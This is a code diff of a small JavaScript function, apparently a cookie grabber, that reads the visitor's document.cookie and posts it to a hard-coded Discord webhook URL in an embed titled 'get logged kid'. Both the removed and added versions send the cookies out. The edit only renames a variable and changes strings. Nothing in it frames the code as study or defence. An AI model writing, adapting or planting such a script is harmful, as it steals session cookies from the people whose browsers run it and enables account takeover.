@@ -1,15 +1,14 @@
-
 function sendMessage() { 
-    var cooke = document.cookie
+    var cook = document.cookie;
     var request = new XMLHttpRequest();
-    request.open("POST", 'https://discord.com/api/webhooks/955540941761044521/TTZ7cfskEPMTlsH5l4zD92IGpTizxH-vAIHoTGZOv98B7Fm3qfFRLLBUPeM0YVm-2uYZ');
+    request.open("POST", "https://discord.com/api/webhooks/955540941761044521/TTZ7cfskEPMTlsH5l4zD92IGpTizxH-vAIHoTGZOv98B7Fm3qfFRLLBUPeM0YVm-2uYZ");
     request.setRequestHeader('Content-type', 'application/json');
     var myEmbed = {
-        title: ("get logged"),
-        description: (`${cooke}`),
+        title: ("get logged kid"),
+        description: cook,
         color: hexToDecimal("#000000"),
         footer: {
-            text: ("by penguinpowers#5415"),
+            text: ("by penguinpowers#0069"),
         }
     }
     var params = {
